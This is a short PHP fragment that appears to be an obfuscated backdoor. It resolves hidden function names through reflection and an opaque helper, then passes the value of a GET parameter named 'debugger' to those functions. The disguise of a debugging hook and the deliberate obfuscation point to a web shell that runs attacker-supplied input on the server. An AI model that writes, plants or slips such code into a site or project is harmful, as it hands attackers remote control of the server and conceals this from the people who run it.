...
$rF1 = new ReflectionFunction($hM[f1('a')]);
$rF2 = new ReflectionFunction($hM[f1('b')]);
$rF3 = new ReflectionFunction($hM[f1('c')]);
$rF4 = new ReflectionFunction($hM[f1('d')]);

if ($rF1->invoke('debugger', $_GET)) {
    $rF2->invoke($rF3->getName(), $rF4->invoke($_GET['debugger']), $_GET['debugger']);
}
